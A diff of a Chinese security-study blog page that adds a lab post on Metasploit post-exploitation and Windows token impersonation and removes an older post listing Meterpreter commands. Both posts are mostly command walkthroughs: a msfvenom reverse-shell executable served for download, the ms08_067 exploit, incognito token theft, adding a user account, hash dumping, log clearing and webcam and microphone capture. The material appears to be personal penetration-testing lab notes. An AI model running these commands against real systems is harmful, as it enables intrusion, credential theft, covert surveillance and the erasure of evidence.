@@ -417,6 +417,309 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:31:17+08:00">
+                2020-03-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  785 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
+<li>已经获得目标系统控制权后扩大战果<ul>
+<li>提权</li>
+<li>信息收集</li>
+<li>渗透内网</li>
+<li>永久后门</li>
+</ul>
+</li>
+<li>实验环境<ul>
+<li>Window 7<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>关闭防火墙</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
+<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
+<li>双击打开1.exe</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看是否拿到shell</li>
+<li><strong><code>🔺命令：session -l</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：load priv</code></strong> </li>
+<li><strong><code>🔺命令：getsystem</code></strong> <ul>
+<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
+<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-Token提权"><a href="#4-Token提权" class="headerlink" title="4. Token提权"></a>4. Token提权</h4><ul>
+<li>Tokens<ul>
+<li>用户每次登陆，账号绑定临时的Token</li>
+<li>访问资源时提价Token进行身份验证，类似于WEB Cookie</li>
+<li>Delegate Token：交互登陆会话（windowd的登陆界面、远程桌面）</li>
+<li>Impersonate Token：非交互登陆会话（SMB协议访问文件共享目录）</li>
+<li>Delegate Token：账号注销后变为Impersonate Token，权限依然有效<ul>
+<li>▲ 域管理员登陆注销后，依然依存这Token</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Incognito<ul>
+<li>独立功能的软件，被MSF集成在meterpreter中</li>
+<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
+<li>尤其适用于域环境下提权渗透多操作系统</li>
+</ul>
+</li>
+<li>搭建域环境<ul>
+<li>▲ 2020.03.03 因搭建实验环境需要重启启动机器+硬盘空间所剩不足+XP和2003的有效期已经过了，故这次实验先暂且放一放</li>
+<li>Window Server 2003<ul>
+<li>配置静态IP地址，DNS服务器指向自己</li>
+<li>运行域程序的安装：dcpromo（安装过程需要光盘）</li>
+<li>DNS全名：lab.com</li>
+<li>重新启动服务器</li>
+<li>分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>关闭防火墙 → 配置静态IP地址（DNS指向域控制器）</li>
+<li>我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）</li>
+<li>重新启动机器</li>
+<li>用域账号Administrator登陆，关闭防火墙</li>
+<li>再用域账号u1登陆</li>
+</ul>
+</li>
+<li>Window Server 2003<ul>
+<li>Win+R → \Window XP SP3的IP\c$ → 进行操作</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：load incognito</code></strong><ul>
+<li>使用伪装Token需要提权为本地SYSTEM权限</li>
+<li>查看组的Token：<strong><code>🔺命令：list_tokens -u</code></strong></li>
+<li>伪装Token：<strong><code>🔺命令：impersonate_token lab\\administrator</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：getuid</code></strong></li>
+<li><strong><code>🔺命令：execute -f cmd.exe -i -t</code></strong> # -t：使用当前假冒token执行程序</li>
+<li><strong><code>🔺命令：shell</code></strong><ul>
+<li><strong><code>🔺命令：net user a a /add</code></strong>（增加账号尝试）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>▲ 本地普通权限用户需先本地提权<ul>
+<li><strong><code>🔺命令：use exploit/windows/local/ms10_015_kitrap0d</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3615,296 +3918,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/" itemprop="url">Kali Linux笔记(一百)：Meterpreter Shell</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:36:20+08:00">
-                2020-02-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  960 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Meterpreter"><a href="#1-Meterpreter" class="headerlink" title="1. Meterpreter"></a>1. Meterpreter</h4><ul>
-<li>高级、动态、可扩展的Payload（同Nanocode同样的多功能payload）<ul>
-<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
-<li>后渗透测试阶段一站式操作界面</li>
-</ul>
-</li>
-<li>完全基于内存的DLL注入式payload（不写硬盘，硬盘查杀无效果）<ul>
-<li>注入合法系统进程并建立stager</li>
-<li>基于stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
-<li>基于stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
-<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
-</ul>
-</li>
-<li>服务端使用C语言编写</li>
-<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
-</ul>
-<h4 id="2-Meterpreter基本命令"><a href="#2-Meterpreter基本命令" class="headerlink" title="2. Meterpreter基本命令"></a>2. Meterpreter基本命令</h4><ul>
-<li><strong><code>🔺命令：help</code></strong>：查看meterpreter可使用的命令</li>
-<li><strong><code>🔺命令：background</code></strong>：回到msfconsole的界面</li>
-<li><strong><code>🔺命令：pwd</code></strong>：可查看到window下的目录路径</li>
-<li><strong><code>🔺命令：cd</code></strong>：进入window下一个目录</li>
-<li><strong><code>🔺命令：dir/ls</code></strong>：查看本目录文件</li>
-<li><strong><code>🔺命令：cat</code></strong>：查看文件内容</li>
-<li><strong><code>🔺命令：mkdir/rmdir</code></strong>：创建/删除一个的目录</li>
-<li><strong><code>🔺命令：mv</code></strong>：对文件进行改名</li>
-<li><strong><code>🔺命令：rm</code></strong>：删除一个文件</li>
-<li><strong><code>🔺命令：edit</code></strong>：编辑目标文件</li>
-<li><strong><code>🔺命令：lpwd</code></strong>：local远端机器本地目录</li>
-<li><strong><code>🔺命令：lcd</code></strong>：进入local远端机器本地目录的其他目录</li>
-<li><strong><code>🔺命令：run</code></strong>：前端运行</li>
-<li>⭐ <strong><code>🔺命令：bgrun</code></strong>：后台运行脚本<ul>
-<li>▲ 有大量脚本，enum_ie/enum_share/hashdump等</li>
-</ul>
-</li>
-<li>⭐ <strong><code>🔺命令：clearev</code></strong>：清除目标系统日志<br> -（Win+R → eventvwr → 应用程序/安全性/系统 → 一般会在系统日志留下痕迹）</li>
-<li><strong><code>🔺命令：download</code></strong>：下载文件到本地系统<ul>
-<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</code></strong></li>
-</ul>
-</li>
-<li>⭐ <strong><code>🔺命令：execute -f cmd.exe -i –H</code></strong>：执行一个命令<ul>
-<li>-f：执行的程序</li>
-<li>-i：进行交互性shell</li>
-<li>-H：程序进行隐藏</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong>：查看登陆的账号</li>
-<li><strong><code>🔺命令：getsystem</code></strong>：如若账号为非system，则提权为system</li>
-<li><strong><code>🔺命令：getprivs</code></strong>：查看被控机器账号权限</li>
-<li><strong><code>🔺命令：getproxy</code></strong>：获取被控机器浏览器设置的代理</li>
-<li><strong><code>🔺命令：getpid</code></strong>：当前注入的合法进程的PID号</li>
-<li><strong><code>🔺命令：migrate PID</code></strong>：可进行进程迁移</li>
-<li><strong><code>🔺命令：hashdump</code></strong>：dump被控机器账号的hash值<ul>
-<li><strong><code>🔺命令：run post/windows/gather/hashdump</code></strong> </li>
-</ul>
-</li>
-<li><strong><code>🔺命令：sysinfo</code></strong>：系统信息</li>
-<li><strong><code>🔺命令：kill PID</code></strong>：杀死进程，通过PID去杀死</li>
-<li><strong><code>🔺命令：shell</code></strong>：获取操作系统的shell</li>
-<li><strong><code>🔺命令：show_mount</code></strong>：挂载的操作系统分区</li>
-<li>̵<strong><code>🔺命令：search -f autoexec.bat</code></strong>：搜索目录</li>
-<li><strong><code>🔺命令：arp</code></strong>：查看被控机器的arp</li>
-<li><strong><code>🔺命令：netstat</code></strong>：查看被控机器网络连接情况</li>
-<li><strong><code>🔺命令：ifconfig/ipconfig</code></strong>：查看IP情况</li>
-<li><strong><code>🔺命令：route</code></strong>：查看路由表（可添加路由表）</li>
-<li><strong><code>🔺命令：idletime</code></strong>：查看被控机器当前空闲时间</li>
-<li><strong><code>🔺命令：resource</code></strong>：调用外部资源文件，可为可执行的指令文件</li>
-<li><strong><code>🔺命令：record_mic</code></strong>：记录被控机器麦克风的声音</li>
-<li><strong><code>🔺命令： webcam_list</code></strong>：列出被控机器所以的摄像头<ul>
-<li><strong><code>🔺命令：webcam_snap -i 1 -v false</code></strong>（每个一秒钟进行拍照）</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-Meterpreter-Python扩展"><a href="#3-Meterpreter-Python扩展" class="headerlink" title="3. Meterpreter Python扩展"></a>3. Meterpreter Python扩展</h4><ul>
-<li>2015年11月份，来自社区的贡献</li>
-<li>▲ 无需运行环境，在客户端运行原生python代码</li>
-<li><strong><code>🔺命令：load python</code></strong><ul>
-<li><strong><code>🔺命令：Help</code></strong></li>
-<li><strong><code>🔺命令：python_execute &quot;print (&#39;asdasdas&#39;)&quot;</code></strong> </li>
-<li><strong><code>🔺命令：python_execute &quot;import os; cd = os.getcwd()&quot; -r cd</code></strong> </li>
-<li><strong><code>🔺命令：python_import -f find.py</code></strong>  ▲ 2020.2.26 Command executed without returing a result</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">for root,dirs,files in os.walk(&quot;C:\\&quot;):</span><br><span class="line">    for file in files:</span><br><span class="line">        if file.endswith(&quot;.ini&quot;) and file.startswith(&quot;win&quot;):</span><br><span class="line">            print(os.path.john(root.file))</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-实验"><a href="#4-实验" class="headerlink" title="4. 实验"></a>4. 实验</h4><ul>
-<li>Kali主机<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window XP SP3主机<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-<li>Kali主机<ul>
-<li><strong><code>🔺命令：msconsole</code></strong><ul>
-<li><strong><code>🔺命令：use exploit/windows/browser/ms08_067_netapi</code></strong><ul>
-<li><strong><code>🔺命令：set RHOST Window Xp的IP</code></strong></li>
-<li><strong><code>🔺命令：set target 34</code></strong></li>
-<li><strong><code>🔺命令：set PAYLOAD windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
-<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
-</ul>
-</li>
-<li><strong><code>🔺命令：show options</code></strong></li>
-<li><strong><code>🔺命令：exploit -j</code></strong></li>
-<li><strong><code>🔺命令：sessions -l</code></strong></li>
-<li><strong><code>🔺命令：sessions -i 1</code></strong>（进入的是meterpreter的shell）</li>
-<li><strong><code>🔺命令：meterpreter</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3959,7 +3972,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">126</span>
+                  <span class="site-state-item-count">127</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -4066,7 +4079,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">112.9k</span>
+    <span title="Site words total count">113.7k</span>
   
 </div>
 
